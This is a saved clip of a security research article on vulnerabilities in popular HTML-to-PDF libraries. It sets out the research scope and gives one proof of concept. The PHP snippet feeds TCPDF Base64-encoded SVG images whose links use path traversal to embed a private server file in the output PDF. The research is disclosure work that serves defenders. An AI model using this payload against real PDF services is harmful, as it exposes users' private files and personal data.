---
raindrop_id: 1521248212
raindrop_highlights:
  6957e425b0e7d53cf874597b: 57f75db061480053148242050400ccdd
  6957e42b6b086fccdd4f78f6: 65bfd23649415ea2c327964b0947acad
  6957e42fecdb70849e2464e0: f9865bc0c334787cd2877d238004475f
  6957e437b0e7d53cf8745d58: ceb4ab0bd0af0b52cb0e2a97f58127c8
  6957e43fc8846fe28650c360: 98d2d2883814b5921ff5d3e7311dcaa9
  6957e474c5186ce46d0dfd7b: ee9484ce62bfb328fbabd23e71b13f76
title: "Blind trust: what is hidden behind the process of creating your PDF file?"

description: |-
  null

source: https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/

created: 1767366338547
type: article
tags:
  - "_index"

 
  - "Inoreader" 
  - "tech-blog"

---
# Blind trust: what is hidden behind the process of creating your PDF file?

![](https://swarm.ptsecurity.com/wp-content/uploads/2025/12/b1a475dc-64bc-7fb3-be26-bcdc4bc1db99.png)

> [!summary]
> null





Blind trust: what is hidden behind the process of creating your PDF file?
Every day, thousands of web services generate PDF (Portable Document Format) files—bills, contracts, reports. This step is often treated as a technical routine, “just convert the HTML,” but in practice it’s exactly where a trust boundary is crossed. The renderer parses HTML, downloads external resources, processes fonts, SVGs, and images, and sometimes has access to the network and the file system. Risky behavior can occur by default, without explicit options or warnings. That is enough for a PDF converter to become an SSRF proxy, a data leak channel, or even cause denial of service.

We therefore conducted a targeted analysis of popular HTML-to-PDF libraries written in the PHP, JavaScript, and Java languages: TCPDF, html2pdf, jsPDF, mPDF, snappy, dompdf, and OpenPDF. During the research, the PT Swarm team identified 13 vulnerabilities, demonstrated 7 intentional behaviors, and highlighted 6 potential misconfigurations. These included vulnerability classes such as Files or Directories Accessible to External Parties, Deserialization of Untrusted Data, Server-Side Request Forgery, and Denial of Service.
In this article, we present a threat model for an HTML-to-PDF library, walk through representative findings for each library, and provide PoC snippets.
To demonstrate a Files or Directories Accessible to External Parties vulnerability, we used a neural network to generate a scan of a passport from a fictitious country. This file simulates sensitive personal data (PII), which security professionals most often encounter during information security audits. For the demonstration, the file will be placed at the following path: /tmp/user_files/user_1/private_image.png.
To demonstrate the Deserialization of Untrusted Data vulnerability, an arbitrary file will be placed on the server at the following path: /tmp/do_not_delete_this_file.txt.  Deleting such a real file on a live system can cause issues such as denial of service or provide a way to bypass certain restrictions at the server or application level. Note that the process deleting this file must have the necessary permissions.

Checking for the /tmp/do_not_delete_this_file.txt file in the system

user@machine:~$ ls /tmp | grep "do_not_delete_this_file.txt"
do_not_delete_this_file.txt
user@machine:~$ ls -l /tmp/do_not_delete_this_file.txt
-rw-r--r-- 1 www-data www-data 36 Aug  4 15:10 /tmp/do_not_delete_this_file.txt
user@machine:~$ cat /tmp/do_not_delete_this_file.txt
3d6d1c81-7e5e-4694-b16d-6b06da3aa281
Exploitation

An attacker sends a payload that contains two images. In this case, we assume that the externally supplied payload is already in the $payload variable.

Each img tag includes a src attribute with a Base64‑encoded string.

Web application source code

<?php
    require __DIR__ . '/vendor/autoload.php';

    $payload = <<<payload
        <html>
            <body>
                <img width="589px" height="415px" src="data:image/svg;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMCAwIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgogICAgPGltYWdlIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIHhsaW5rOmhyZWY9Ii4uLy4uLy4uLy4uLy4uLy4uL3RtcC91c2VyX2ZpbGVzL3VzZXJfMS9wcml2YXRlX2ltYWdlLnBuZyIgLz4KPC9zdmc+">
                <img width="589px" height="415px" src="data:image/svg;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMCAwIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgogICAgPGltYWdlIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIHhsaW5rOmhyZWY9Ii8uLi8uLi8uLi8uLi8uLi8uLi90bXAvdXNlcl9maWxlcy91c2VyXzEvcHJpdmF0ZV9pbWFnZS5wbmciIC8+Cjwvc3ZnPg==">
            </body>
        </html>
    payload;

    $pdf = new TCPDF('P', 'mm', 'A4', true, 'UTF-8', false);
    $pdf->AddPage();
    $pdf->writeHTML($payload);
    $pdf->Output('./generated_file.pdf', 'I');
?>


